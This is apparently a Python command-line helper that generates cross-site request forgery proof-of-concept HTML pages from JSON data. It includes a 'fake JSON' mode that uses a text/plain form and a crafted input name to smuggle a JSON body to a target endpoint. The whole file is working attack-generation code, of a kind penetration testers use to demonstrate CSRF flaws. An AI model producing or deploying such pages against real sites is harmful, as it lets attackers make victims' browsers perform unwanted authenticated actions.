import os, json, argparse

template = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <title>cool form</title>
</head>
<body>
    <h1 id="header">cool form...</h1>
    <form id="form" method="post" action="https://example.com" enctype="{enctype}">{text}
        <button type="submit"></button>
    </form>
    <script>
    </script>
</body>
</html>'''

property_template = "\n\t<input name='{name}' id='{name}' type='text' value='{value}'>"

def convert_default(data:dict):

    text = ""
    for key in data:
        value = data[key]
        if type(value) != str and type(value) != int:
            continue
        text += property_template.format(name=key,value=value)

    text = template.format(text=text,enctype="application/x-www-form-urlencoded")
    print(text)

# following https://dant0x65.medium.com/json-csrf-a1594955dd75
def convert_fake_json(data:dict):
    text = json.dumps(data)[:-1] + ',"a":'
    text = property_template.format(name=text,value='"}')

    text = template.format(text=text,enctype="text/plain")
    print(text)

parser = argparse.ArgumentParser()
parser.add_argument("-p","--path")
parser.add_argument("-d","--data")
parser.add_argument("-f","--fakejson",action="store_true")

args = parser.parse_args()

print(args)
if not args.path and not args.data:
    parser.print_help()
    quit()

elif args.path and args.data:
    parser.print_help()
    quit()

elif args.path:
    if not os.path.isfile(args.path):
        print("File doesn't exist")
        quit()
    with open(args.path,"r") as f:
        data = json.load(f)

elif args.data:
    data = json.loads(args.data)

if args.fakejson:
    convert_fake_json(data)
else:
    convert_default(data)